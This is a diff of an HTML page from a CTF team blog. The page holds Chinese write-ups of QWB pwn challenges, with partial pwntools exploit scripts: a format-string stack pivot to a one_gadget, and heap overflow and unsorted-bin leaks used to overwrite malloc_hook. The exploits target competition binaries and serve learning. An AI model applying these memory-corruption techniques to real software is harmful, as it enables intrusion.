+</span></span></code></pre></div><p><img src="https://hackmd.summershrimp.com/uploads/upload_dd2a1b0987a7931fcf7479b8dbd231a6.png" alt=""></p>
 <p>得到3e752bf509ddb4e9a42f1ef30beff495</p>
 <p>flag提交一直不对，改一下格式即可：QWB{3e752bf509ddb4e9a42f1ef30beff495}</p>
 <h3 id="siri---强网先锋">Siri - 强网先锋</h3>
 <p>一个简单的格式化字符串,leak了stack地址之后就是对上面的地址进行一个返回地址和保存的rbp进行一个修改,通过抬栈 执行 one_gadget</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span><span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span><span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;123.56.170.202&#39;</span><span class="p">,</span><span class="mi">12124</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
@@ -3376,48 +1857,9 @@ get flag</p>
 </span></span><span class="line"><span class="cl">	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rce</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="just-a-galgame---强网先锋">Just a Galgame - 强网先锋</h3>
+</span></span></code></pre></div><h3 id="just-a-galgame---强网先锋">Just a Galgame - 强网先锋</h3>
 <p>如果top_chunk的size 不够申请的大小,就会另外开辟一个top_chunk,将原先top_chunk扔进unsorted bin,切割后拿到libc_base,在case 5有个read(0,0x4040A0,8);往栈上写一个地址,然乎case 2没有对 index 索引进行一个 检测 越界修改这个地址里面的内容,即可将malloc_hook写为rce</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
 </span></span><span class="line"><span class="cl">context.log_level =&#39;DEBUG&#39;
 </span></span><span class="line"><span class="cl">def menu(ch):
 </span></span><span class="line"><span class="cl">	p.sendlineafter(&#39;&gt;&gt; &#39;,str(ch))
@@ -3450,74 +1892,9 @@ get flag</p>
 </span></span><span class="line"><span class="cl">edit(8,p64(rce))
 </span></span><span class="line"><span class="cl">new()
 </span></span><span class="line"><span class="cl">p.interactive()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="babynotes---强网先锋">babynotes - 强网先锋</h3>
+</span></span></code></pre></div><h3 id="babynotes---强网先锋">babynotes - 强网先锋</h3>
 <p>因为在regset中 strcpy 可以导致堆溢出修改下一个块的size,则可构造 chunk overlap,然后往malloc_hook中写入rce</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
 </span></span><span class="line"><span class="cl">#context.log_level =&#39;DEBUG&#39;
 </span></span><span class="line"><span class="cl">def menu(ch):
 </span></span><span class="line"><span class="cl">	p.sendlineafter(&#39;&gt;&gt; &#39;,str(ch))
@@ -3576,106 +1953,115 @@ get flag</p>
 </span></span><span class="line"><span class="cl">free(0)
 </span></span><span class="line"><span class="cl">new(0,0x60)
 </span></span><span class="line"><span class="cl">p.interactive()
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
+</span></span></code></pre></div>
 
-        
-          <div class="blog-tags">
+            
+              <div class="blog-tags">
+                
+                  <a href="http://localhost:1313/tags/qwb/">QWB</a>
+                
+              </div>
+            
+
+            
+
             
               
-              <a href="http://localhost:1313/tags/qwb/">QWB</a>&nbsp;
-            
-          </div>
-        
+                
+              
 
-        
-
-        
-          
-            
-          
-
-          
+              
+                <section class="article-related">
                   <h4 class="see-also">See also</h4>
                   <ul>
-                
-                
-                    <li><a href="/post/qwb-s9-su-wu/">2025 QWB-S9 SU WriteUp</a></li>
-                
-              </ul>
+                    
+                    
+                      <li><a href="/post/qwb-s9-su-wu/">2025 QWB-S9 SU WriteUp</a></li>
+                    
+                  </ul>
+                </section>
+              
+            
+          </article>
+        </section>
 
-          
         
-      </article>
+          <ul class="pager blog-pager">
+            
+              <li class="previous">
+                <a href="/post/wmctf-2020-su-wu/" data-toggle="tooltip" data-placement="top" title="WMCTF 2020 SU Write-Up">&larr; Previous Post</a>
+              </li>
+            
+            
+              <li class="next">
+                <a href="/post/ntfy-2021-su-wu/" data-toggle="tooltip" data-placement="top" title="第四届“强网”拟态防御国际精英挑战赛 SU Write-Up">Next Post &rarr;</a>
+              </li>
+            
+          </ul>
+        
 
-      
-        <ul class="pager blog-pager">
-          
-            <li class="previous">
-              <a href="http://localhost:1313/post/wmctf-2020-su-wu/" data-toggle="tooltip" data-placement="top" title="WMCTF 2020 SU Write-Up">&larr; Previous Post</a>
-            </li>
-          
-          
-            <li class="next">
-              <a href="http://localhost:1313/post/ntfy-2021-su-wu/" data-toggle="tooltip" data-placement="top" title="第四届“强网”拟态防御国际精英挑战赛 SU Write-Up">Next Post &rarr;</a>
-            </li>
-          
-        </ul>
-      
-
-
-      
-
-    </div>
+        
+      </div>
   </div>
 </div>
 
-      <footer>
+      <footer class="site-footer">
   <div class="container">
     
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <ul class="list-inline text-center footer-links">
+
+    <div class="site-footer__grid">
+      <div class="site-footer__brand">
+        <p class="site-footer__eyebrow">SU TEAM // BATTLE LOG</p>
+        <h2 class="site-footer__title">su-team</h2>
+        <p class="site-footer__tagline">
+          Built for team archives and competition writeups.
+          
+            <span class="site-footer__subline">Minimal noise, high signal, and fast navigation.</span>
+          
+        </p>
+      </div>
+
+      <div class="site-footer__meta">
+        <ul class="list-inline footer-links">
           
               <li>
                 
-		  <a href="https://ctftime.org/team/29641" title="CTFTime">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <img src="http://localhost:1313/img/ctftime.svg" title="CTFTime" alt="CTFTime" style="width:60%;height:60%;position:absolute;top:20%;left:20%">
-                    
-                  </span>
-                </a>
+                  <a href="https://ctftime.org/team/29641" title="CTFTime">
+                
+                    <span class="footer-link__icon">
+                      
+                        
+                          <img class="footer-social-img" src="/img/ctftime.svg" title="CTFTime" alt="CTFTime">
+                        
+                      
+                    </span>
+                  </a>
               </li>
               <li>
                 
-		  <a href="mailto:suers_xctf@126.com" title="Email me">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
-                    
-                  </span>
-                </a>
+                  <a href="mailto:suers_xctf@126.com" title="Email me">
+                
+                    <span class="footer-link__icon">
+                      
+                        <i class="fas fa-envelope" aria-hidden="true"></i>
+                      
+                    </span>
+                  </a>
               </li>
               <li>
                 
-		  <a href="https://github.com/team-su" title="GitHub">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <i class="fab fa-github fa-stack-1x fa-inverse"></i>
-                    
-                  </span>
-                </a>
+                  <a href="https://github.com/team-su" title="GitHub">
+                
+                    <span class="footer-link__icon">
+                      
+                        <i class="fab fa-github" aria-hidden="true"></i>
+                      
+                    </span>
+                  </a>
               </li>
           
         </ul>
+
         <p class="credits copyright text-muted">
           
             
@@ -3690,10 +2076,10 @@ get flag</p>
 
           
             &nbsp;&bull;&nbsp;
-            <a href="http://localhost:1313/">su-team</a>
+            <a href="/">su-team</a>
           
         </p>
-        
+
         <p class="credits theme-by text-muted">
           <a href="https://gohugo.io">Hugo v0.157.0</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
           
@@ -3724,8 +2110,6 @@ get flag</p>
 
 <script src="http://localhost:1313/js/main.js"></script><script src="http://localhost:1313/js/photoswipe.min.js"></script>
 <script src="http://localhost:1313/js/photoswipe-ui-default.min.js"></script><script src="http://localhost:1313/js/load-photoswipe.js"></script>
-
-
 
 
 
